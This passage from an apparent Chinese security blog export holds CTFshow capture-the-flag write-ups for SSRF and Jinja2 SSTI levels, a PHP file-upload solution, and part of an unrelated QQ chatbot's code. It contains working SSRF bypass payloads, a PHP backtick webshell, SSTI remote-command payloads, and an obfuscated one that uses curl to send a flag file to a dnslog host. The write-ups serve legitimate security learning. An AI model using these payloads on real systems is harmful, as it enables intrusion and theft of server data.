是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n\n## 相关函数和类\n\nfile_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中\nreadfile()：输出一个文件的内容\nfsockopen()：打开一个网络连接或者一个Unix 套接字连接\ncurl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用\nfopen()：打开一个文件文件或者 URL\nPHP原生类SoapClient在触发反序列化时可导致SSRF\n\n## 相关协议\n\nfile协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容\ndict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等\ngopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell\nhttp/s协议：探测内网主机存活\n\n## 绕过方法\n\n- `http://0.0.0.0/`\n\n  测试了下这个方法只能在linux下使用，windows并不认识这个IP\n\n- `http://foo@127.0.0.1:80@www.google.com/hint.php`\n\n  此处利用了不同库解析url的差异\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206181201647.JPG)\n\n  不过这个方法在curl较新的版本里被修掉了，buu上的环境也无法使用\n\n- DNS Rebinding\n\n  用这个，将同一域名绑定在不同的IP下，这样返回DNS请求查询的时候随机返回一个，就导致判断和真正curl发送请求的不是同一个IP\n\n- `http://127。0。0。1/hint.php`\n\n  这个本地倒是测试成功了，buu上就不行，可能跟curl版本有关吧\n\n- `http://127.1/hint.php`\n\n  `ip2long('127.1')`会返回`false`，这里可以绕过\n\n  但是`gethostbyname`在linux下会把`127.1`变为`127.0.0.1`，所以这题是无法使用的\n\n  不过windows下经过`gethostbyname`后依然是`127.1`，curl是支持`127.1`这样的写法的，但这样发出去的http请求是有问题的。因为http包中的host头被设为了`127.1`，apache会返回一个400 Bad Request\n\n  但是这样构造的gopher请求是可行的\n\n- 进制绕过\n\n- 和127.1类似，也是存在不能用http的问题，但是`gethostbyname`并不会有影响，可用比如\n\n  ```\n  gopher://0177.0.0x0001:80\n  ```\n\n- `http://127.0.0.1./`\n\n  curl不支持\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**351**\n\n```PHP\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n?>\n# curl_init — 初始化 cURL 会话    \n# curl_setopt — 设置一个cURL传输选项\n# curl_exec — 执行 cURL 会话\n# curl_close — 关闭 cURL 会话\n```\n\n\n\n```\npayload:\nPOST:\nurl=http://127.0.0.1/flag.php\n```\n\n**352**\n\n`parse_url`函数作用是将一个URL拆分，格式如下：\n\n```PHP\n<?php\n$url = 'http://username:password@hostname/path?arg=value#anchor';\nprint_r(parse_url($url));\n?>\n以上例程会输出：\nArray\n(\n[scheme] => http\n[host] => hostname\n[user] => username\n[pass] => password\n[path] => /path\n[query] => arg=value\n[fragment] => anchor\n)\n```\n\n同上即可\n\n**353**\n\n绕过127.0.0.1，可使用进制转换或其他IP\n\n```\n进制转换：\n整数转换过程，将每一位IP转换为二进制并进行拼接\n2130706433 //十进制整数\n0x7F.0.0.1 //十六进制\n0177.0.0.1 //八进制\n0x7F000001 //十六进制整数\n```\n\n```\n其他IP：\n127.127.127.127\n0\n0.0.0.0\n```\n\n**354**\n\n过滤没了，只能指向其他域名\n\n1、将自己域名解析为127.0.0.1\n\n2、将自己网站设置为302重定向到127.0.0.1\n\n**355**\n\n用0或者127.1\n\n0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0\n\n**356**\n\n更短了只能用0\n\n**357**\n\n```PHP\ngethostbyname — 返回主机名对应的 IPv4地址\n# php filter函数\nfilter_var()\t获取一个变量，并进行过滤\nfilter_var_array()\t获取多个变量，并进行过滤\n......\n# PHP 过滤器\nFILTER_VALIDATE_IP\t把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围\nFILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）\nFILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）\nFILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）\nFILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。\n```\n\n由于获取到了指向域名的IP值所以域名指向127.0.0.1不再生效，只能使用302重定向或者**DNS rebinding（DNS重新绑定攻击）**\n\n### DNS rebinding：\n\n```\n攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址，甚至可以通过这种攻击方法绕过同源策略\n回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 ceye.io 来实现攻击，DNS Rebinding 中设置两个 IP，一个是 127.0.0.1 另一个是随便可以访问的 IP\n```\n\n**358**\n\n正则匹配要求URL以http://ctf.开头，以show结尾\n\n一个完整的URL的格式如下\n\n`http://username:password@hostname/path?arg=value#anchor`\n\n其中hostname就是我们平常使用的网址，我们只需要让username位置为ctf.，让anchor位置为show即可\n\n```\npayload:\nPOST\nurl=http://ctf.@127.0.0.1/flag.php#show\n```\n\n**359**\n\n随便输入个用户名密码尝试登录\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 01.12.20.png)\n\n抓包发现returl参数可能存在SSRF注入点，使用Gopherus生成攻击payload\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 22.36.11.png)\n\n写入之后访问即可\n\n**360**\n\n同上\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 22.44.48.png)\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFshow记录","url":"/posts/82271b5a.html","content":"\n### baby杯——baby_php\n\n审计代码，明显是文件上传\n\n```PHP\nclass fileUtil{\n\n    private $name;\n    private $content;\n\n\n    public function __construct($name,$content=''){\n        $this->name = $name;\n        $this->content = $content;\n        ini_set('open_basedir', '/var/www/html');\n    }\n\n    public function file_upload(){\n        if($this->waf($this->name) && $this->waf($this->content)){\n            return file_put_contents($this->name, $this->content);\n        }else{\n            return 0;\n        }\n    }\n\n    private function waf($input){\n        return !preg_match('/php/i', $input);\n    }\n\n    public function file_download(){\n        if(file_exists($this->name)){\n            header('Content-Type: application/octet-stream');\n            header('Content-Disposition: attachment; filename=\"'.$this->name.'\"');\n            header('Content-Transfer-Encoding: binary');\n            echo file_get_contents($this->name);\n        }else{\n            return False;\n        }\n    }\n\n    public function __destruct(){\n\n    }\n\n}\n\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload':\n        $name = $_POST['name'];\n        $content = $_POST['content'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_upload()){\n            echo $name.' upload success!';\n        }\n        break;\n    case 'download':\n        $name = $_POST['name'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_download()===False){\n            echo $name.' download failed';\n        }\n        break;\n    default:\n        echo 'baby come on';\n        break;\n}\n```\n\n小知识：$_GET['a']在没有被赋值时默认值时true，case的判定是弱相等\n\n关键代码\n\n```PHP\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){//a只声明不赋值默认为true，强相等判定无法通过\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload'://true==\"upload\"，判定结果为真，进入upload上传文件\n```\n\n查看响应头中间件为nginx，上传.user.ini文件来包含，一定要先上传1.txt文件，不然在auto_prepend_file参数生效并且找不到1.txt时整个环境就废了\n\n```\npayload:?a=\nPOST:\ncontent=<?=`$_GET['kkk']`;?>&name=1.txt\nPOST:\ncontent=auto_prepend_file=\"1.txt\"&name=.user.ini\n\npayload:?kkk=tac /flag_baby_here_you_are\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowSSTI","url":"/posts/45647.html","content":"\n# SSTI\n\n### **Python中有用的魔术方法**\n\n```python\n__class__           查看对象所在的类\n__mro__             查看继承关系和调用顺序，返回元组\n__base__            返回基类\n__bases__           返回基类元组\n__subclasses__()    返回子类列表\n__init__            调用初始化函数，可以用来跳到__globals__\n__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典\n__builtins__        返回内建内建名称空间字典\n__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里\n__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）\t\t都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。\n__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')\n__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。\n__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()\n__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。\nurl_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app\nget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app\nlipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}\n{{cycler.__init__.__globals__.os.popen('ls').read()}}\ncurrent_app          应用上下文，一个全局变量\nrequest              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()\nrequest.args.x1   \t get传参\nrequest.values.x1 \t 所有参数\nrequest.cookies      cookies参数\nrequest.headers      请求头参数\nrequest.form.x1   \t post传参\t(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)\nrequest.data  \t\t post传参\t(Content-Type:a/b)\nrequest.json\t\t post传json  (Content-Type: application/json)\nconfig               当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n```\n\n### 代码块\n\n```\n变量块 {{}}\t用于将表达式打印到模板输出\n注释块 {##}\t注释\n控制块\t{%%}\t可以声明变量，也可以执行语句\n行声明\t##\t\t可以有和{%%}相同的效果\n```\n\n### 常用的过滤器\n\n```\nint()：将值转换为int类型；\nfloat()：将值转换为float类型；\nlower()：将字符串转换为小写；\nupper()：将字符串转换为大写；\ntitle()：把值中的每个单词的首字母都转成大写；\ncapitalize()：把变量值的首字母转成大写，其余字母转小写；\ntrim()：截取字符串前面和后面的空白字符；\nwordcount()：计算一个长字符串中单词的个数；\nreverse()：字符串反转；\nreplace(value,old,new)： 替换将old替换为new的字符串；\ntruncate(value,length=255,killwords=False)：截取length长度的字符串；\nstriptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；\nescape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。\nsafe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；\nlist()：将变量列成列表；\nstring()：将变量转换成字符串；\njoin()：将一个序列中的参数值拼接成字符串。示例看上面payload；\nabs()：返回一个数值的绝对值；\nfirst()：返回一个序列的第一个元素；\nlast()：返回一个序列的最后一个元素；\nformat(value,arags,*kwargs)：格式化字符串。比如：{{ \"%s\" - \"%s\"|format('Hello?',\"Foo!\") }}将输出：Helloo? - Foo!\nlength()：返回一个序列或者字典的长度；\nsum()：返回列表内数值的和；\nsort()：返回排序后的列表；\ndefault(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。\nlength()返回字符串的长度，别名是count\n```\n\n### **Flask的一些全局变量 && 关键字**\n\n```python\n{{config}}\n{{requests}}\n{{requests.environ}}\n{{self}}\n{{url_for}}\n{{get_flashed_messages}}\n{{url_for.__globals__[\"os\"].system('calc')}}\n```\n\n### 常用payload\n\n```\n>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\n>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n//想要获取命令执行结果可以在后面加上.read()\n>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()\n \n--------------------------------\n \n>>>object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()\n \n--------------------------------\n{{''.__class__.__mro__[-1].__subclasses__()[200]('calc') }}\n其中的xxxx可以为任意字符\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval(\"__import__('os').popen('whoami').read()\") }}\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec(\"__import__('os').popen('calc').read()\") }} #本地测试不知道为什么执行whoami只会返回None\n\n```\n\n[拓展](https://dar1in9s.github.io/2020/09/15/ssti进阶/)\n\n### 16进制绕过\n\n可使用16进制绕过关键字符\n\n```\n\\x5f _\n```\n\n寻找可用类脚本\n\n```python\nimport json\n\na = \"\"\"\n\"\"\"\n\nnum = 0\nallList = []\n\nresult = \"\"\nfor i in a:\n    if i == \">\":\n        result += i\n        allList.append(result)\n        result = \"\"\n    elif i == \"\\n\" or i == \",\":\n        continue\n    else:\n        result += i\n\nfor k, v in enumerate(allList):\n    if \"os._wrap_close\" in v:\n        print(str(k) + \"--->\" + v)\n```\n\n#### [除了python之外的SSTI](https://www.cnblogs.com/bmjoker/p/13508538.html)\n\n\n\n\n\n\n\n**361**\n\n无过滤，参数名为name，直接执行命令即可\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**362**\n\n过滤了数字，使用全角数字代替正常数字\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**363**\n\n过滤了单双引号，可通过request.args传入新参数解决，或者使用chr来绕过\n\n```\n//request.args\npayload:?name={{config.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=tac /flag\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**364**\n\n过滤了args，无法使用GET传参了，使用~~POST（方法被禁用了）~~或者cookie都可\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}\nCookie: a=os;b=popen;c=tac /flag;\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**365**\n\n过滤了中括号，换点\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__.os.popen(request.cookies.a).read()}}\nCookie: a=tac /flag\n```\n\n**366**\n\n过滤了下划线，这里用attr方法：request|attr(request.cookies.a)等价于request[“a”]\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).os.popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag;\n```\n\n他人WP\n\n```\npayload:?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}\nCookie: a=__globals__;b=cat /flag;\n```\n\n**367**\n\n过滤了os，继续用attr\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**368**\n\n过滤了{undefined{undefined，使用命令方式print\n\n```\npayload:?name={% print((config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()) %}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**369**\n\n过滤了request，没办法传递参量了，使用模版过滤器\n\n```\npayload:?name={% set po=dict(po=a,p=a)|join%}//构造pop，为下方提供_\n{% set a=(()|select|string|list)|attr(po)(24)%}//构造出_\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}//构造出__init__\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}//构造出__globals__\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}//构造出__getitem__\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}//构造出__builtins__\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}//构造出builtins模块\n{% set chr=x.chr%}//使用chr函数\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}//构造出字符串/flag\n{%print(x.open(file).read())%}//读文件\n```\n\n**370**\n\n过滤数字用全角，或者使用length，count构造数字\n\n```\npayload:?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(２４)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}\n{%print(x.open(file).read())%}\n```\n\n**371**\n\nprint回显被禁，dnslog外带\n\n```\n?name={%set po=(dict(po=a,p=a)|join)%}\n{% set ershisi=(dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|length)%}\n{% set xiahuaxian=(()|select|string|list)|attr(po)(ershisi)%}\n{% set ur=((dict(ur=a,l=a)|join,xiahuaxian,dict(fo=a,r=a)|join)|join)%}\n{% set glo=((xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join)%}\n{% set ous=(dict(o=a,s=a)|join)%}\n{% set ouuu=(ur|attr(glo)|attr(ous))%}\n```\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n**372**\n\ncount换成length\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n","tags":["CTF","web","SSTI"]},{"title":"罗伯特","url":"/posts/61106.html","content":"\n```python\n#bot.py\nfrom unittest.mock import NonCallableMagicMock\nfrom flask import Flask, request\nimport requests\nimport api\napp = Flask(__name__)\n\n'''监听端口，获取QQ信息'''\n@app.route('/', methods=[\"POST\"])\ndef post_data():\n    '下面的request.get_json().get......是用来获取关键字的值用的，关键字参考上面代码段的数据格式'\n    if request.get_json().get('message_type')=='private':\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        api.keywordForPerson(message,uid)\n    if request.get_json().get('message_type')=='group':\n        gid = request.get_json().get('group_id')\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        nick=request.get_json().get('sender').get('nickname')\n        role=request.get_json().get('sender').get('role')\n        api.keywordForGroup(message, gid, uid,nick,role)\n    return 'OK'\n\n\nif __name__ == '__main__':\n    app.run(debug=True, host='127.0.0.1', port=5701)\n\n```\n\n```python\n#api.py\nimport person\nimport group\nimport requests\nimport re\nimport time\nimport json\nimport random\n\n\n\ndef help():\n    return \"天气：输入天气 地名，获取当地天气，默认为徐州天气\\n双色球：输入双色球查看最新一期双色球开奖信息以及奖池累计金额\\n扔瓶子：私聊罗伯特并发送以下内容：\\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\\n来扔瓶子\\n捞瓶子：发送捞瓶子来捞别人扔的瓶子\\n帮助：输入/help，获取帮助\"\ndef weather(message):\n    try:\n        city=message.split(' ')[1]\n    except:\n        city='徐州'\n    try:\n        ercode=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city,timeout=1).text\n    except:\n        return \"罗伯特被学校关起来了呜呜\"\n    if \"invilad-citykey\" in ercode:\n        return \"抱歉，您的输入有误，请检查后再试\"\n    weatherInfo=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['forecast'][0]\n    ganmao=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['ganmao']\n    fl=re.search(r\"[0-9]+\",weatherInfo['fengli']).group(0)\n    hi=re.search(r\"[0-9]+\",weatherInfo['high']).group(0)\n    lo=re.search(r\"[0-9]+\",weatherInfo['low']).group(0)\n    weatherInfo=f\"今日{city}天气{weatherInfo['type']}，最高温度{hi}℃，最低温度{lo}℃，{weatherInfo['fengxiang']}{fl}级\\n温馨提示，{ganmao}\"\n    return weatherInfo\ndef buquan(message,uid):\n    #计算括号数量并自动补全\n    def countBracket(message):\n        countban=0\n        for i in message:\n            if i=='(':\n                countban+=1\n            if i==')':\n                countban-=1\n        countquan=0\n        for i in message:\n            if i=='（':\n                countquan+=1\n            if i=='）':\n                countquan-=1\n        return {'ban':countban,'quan':countquan}\n    #自动补全括号\n    ban=countBracket(message)['ban']\n    quan=countBracket(message)['quan']\n    bu=\"\"\n    if not (ban or quan):\n        return\n    if ban>0:\n        for i in range(ban):\n            bu+=')'\n    elif ban<0:\n        for i in range(-ban):\n            bu+='('\n    if quan>0:\n        for i in range(quan):\n            bu+='）'\n    elif quan<0:\n        for i in range(-quan):\n            bu+='（'\n    print(bu+f\"[CQ:at,qq={uid}]帮你补括号\")\n    return bu+f\"[CQ:at,qq={uid}]帮你补括号\"\ndef theDoubleChromosphere(uid):\n    tex=requests.get(\"http://www.cwl.gov.cn/fcpz/yxjs/ssq/\").text\n    #获取红球\n    red=re.search(r\"<div class=\\\"ssqRed-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    red=red.split(',')\n    #获取蓝球\n    blue=re.search(r\"<div class=\\\"ssqBlue-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    blue=blue.split(',')\n    #获取期号\n    qh=re.search(r\"<div class=\\\"ssqQh-dom\\\">(.*?)</div>\",tex).group(1)\n    #获取奖池\n    pool=re.search(r\"<div class=\\\"ssqPool-dom\\\">(.*?)</div>\",tex).group(1)\n    return f\"第{qh}期开奖结果为：\\n红球：{red}\\n蓝球：{blue}\\n奖池：{pool}\\n[CQ:at,qq={uid}]害搁着等着干啥呢，赶紧买彩票去啊\"\ndef sign(gid,uid,nick):\n    today=time.strftime(\"%Y-%m-%d\",time.localtime())\n    groupUserInfo=group.readGroupUserInfo()\n    try:\n        thisGroupUserInfo=groupUserInfo[str(gid)]\n    except:\n        thisGroupUserInfo={}\n        thisGroupUserInfo[str(uid)]={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n        thisGroupUserInfo[str(uid)]=thisUser\n    if thisUser['signTime']==today:\n        return f\"[CQ:at,qq={uid}]您今天已经签到过了，明天再来吧\"\n    else:\n        thisUser['point']+=1\n        thisUser['signTime']=today\n        group.saveGroupUserInfo(groupUserInfo)\n        return f\"[CQ:at,qq={uid}]签到成功，您的积分为{thisUser['point']}，明天再来吧\"\ndef getQQ(message):\n    try:\n        qq=re.search(r\"qq=(\\d+)\",message).group(1)\n    except:\n        qq=None\n    return qq\ndef ban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=True\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return 